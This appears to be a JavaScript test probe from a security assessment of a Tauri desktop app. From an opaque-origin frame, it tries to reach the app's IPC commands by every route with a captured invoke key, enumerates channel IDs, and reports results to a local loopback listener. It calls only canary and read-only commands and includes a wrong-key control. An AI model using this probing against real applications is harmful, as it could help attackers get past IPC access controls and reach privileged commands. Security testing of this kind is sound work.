// M1 A1/A2: from an opaque-origin loopback frame, try every IPC route with the real invoke key.
let REP = null;
function rep(k, v) {
  try { new Image().src = 'http://127.0.0.1:' + REP + '/r?' + encodeURIComponent(k) + '=' + encodeURIComponent(String(v)); } catch (e) {}
}
window.addEventListener('error', (e) => rep('frame_error', e.message));
window.addEventListener('message', async (ev) => {
  if (!ev.data || ev.data.m1 !== 'cfg') return;
  const { cfg, key } = ev.data;
  REP = cfg.report;
  rep('variant', cfg.variant);
  rep('ua', navigator.userAgent);
  rep('origin', location.origin + ' | ' + (typeof self.origin !== 'undefined' ? self.origin : 'n/a'));
  rep('key_received', key ? 'yes(len ' + key.length + ')' : 'NO');
  rep('globals', JSON.stringify({
    TAURI_INTERNALS: typeof window.__TAURI_INTERNALS__,
    TAURI: typeof window.__TAURI__,
    ipc: typeof window.ipc,
    webkit_ipc: !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ipc),
    chrome_webview: typeof (window.chrome && window.chrome.webview),
    TAURI_IPC: typeof window.__TAURI_IPC__,
  }));
  const body = (cmd, payload, id) => JSON.stringify({ cmd, callback: 1000 + id, error: 2000 + id, payload: payload || {}, options: {}, __TAURI_INVOKE_KEY__: key });
  let n = 0;
  // 1. webkit message handler
  try {
    window.webkit.messageHandlers.ipc.postMessage(body('addon_canary', { arg: 'A1-webkit' }, n++));
    rep('A1_webkit_post', 'sent');
  } catch (e) { rep('A1_webkit_post', 'threw ' + e); }
  // 2. window.ipc.postMessage
  try { window.ipc.postMessage(body('addon_canary', { arg: 'A1-window.ipc' }, n++)); rep('A1_window_ipc', 'sent'); } catch (e) { rep('A1_window_ipc', 'threw ' + e); }
  // 3. chrome.webview
  try { window.chrome.webview.postMessage(body('addon_canary', { arg: 'A1-chrome.webview' }, n++)); rep('A1_chrome_webview', 'sent'); } catch (e) { rep('A1_chrome_webview', 'threw ' + e); }
  // 4/5. custom protocol fetch
  async function viaFetch(label, url, cmd, extraHeaders) {
    try {
      const r = await fetch(url, {
        method: 'POST',
        headers: Object.assign({ 'Content-Type': 'application/json', 'Tauri-Callback': String(3000 + n), 'Tauri-Error': String(4000 + n++), 'Tauri-Invoke-Key': key }, extraHeaders || {}),
        body: JSON.stringify({ arg: label }),
      });
      const t = await r.text();
      rep(label, 'status=' + r.status + ' tauri-response=' + r.headers.get('Tauri-Response') + ' body=' + t.slice(0, 160));
    } catch (e) { rep(label, 'fetch threw ' + e); }
  }
  await viaFetch('A1_ipc_scheme', 'ipc://localhost/addon_canary', 'addon_canary');
  await viaFetch('A1_http_ipc.localhost', 'http://ipc.localhost/addon_canary', 'addon_canary');
  await viaFetch('A1_https_ipc.localhost', 'https://ipc.localhost/addon_canary', 'addon_canary');
  // 6. plugin commands, event listener
  try { window.webkit.messageHandlers.ipc.postMessage(body('plugin:event|listen', { event: 'm1-evt', target: { kind: 'Any' }, handler: 7 }, n++)); rep('A1_event_listen', 'sent'); } catch (e) { rep('A1_event_listen', 'threw ' + e); }
  await viaFetch('A1_plugin_event_listen_fetch', 'ipc://localhost/plugin%3Aevent%7Clisten', 'x');
  // app-level destructive-class command (arg-less, harmless): agmsg_is_installed reads state only
  await viaFetch('A1_agmsg_is_installed', 'ipc://localhost/agmsg_is_installed', 'x');
  // 7. channel fetch endpoint (ACL-exempt in tauri 2.11.3)
  const ch = { tried: 0, data: 0, notfound: 0, other: {} };
  for (let id = 0; id < 120; id++) {
    ch.tried++;
    try {
      const r = await fetch('ipc://localhost/plugin%3A__TAURI_CHANNEL__%7Cfetch', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Tauri-Callback': '1', 'Tauri-Error': '2', 'Tauri-Invoke-Key': key, 'Tauri-Channel-Id': String(id) }, body: '{}' });
      const b = await r.arrayBuffer();
      const t = new TextDecoder().decode(b.slice(0, 40));
      if (r.headers.get('Tauri-Response') === 'ok') ch.data++; else if (/not found/.test(t)) ch.notfound++; else ch.other[t] = (ch.other[t] || 0) + 1;
    } catch (e) { ch.other['threw ' + e.name] = (ch.other['threw ' + e.name] || 0) + 1; }
  }
  rep('A1_channel_fetch_0_119', JSON.stringify(ch));
  // 8. a command with the *wrong* key (control: must not enter)
  try { window.webkit.messageHandlers.ipc.postMessage(JSON.stringify({ cmd: 'addon_canary', callback: 1, error: 2, payload: { arg: 'A1-wrongkey' }, options: {}, __TAURI_INVOKE_KEY__: 'wrong' })); rep('A1_wrongkey', 'sent'); } catch (e) { rep('A1_wrongkey', 'threw ' + e); }
  rep('done', n);
});
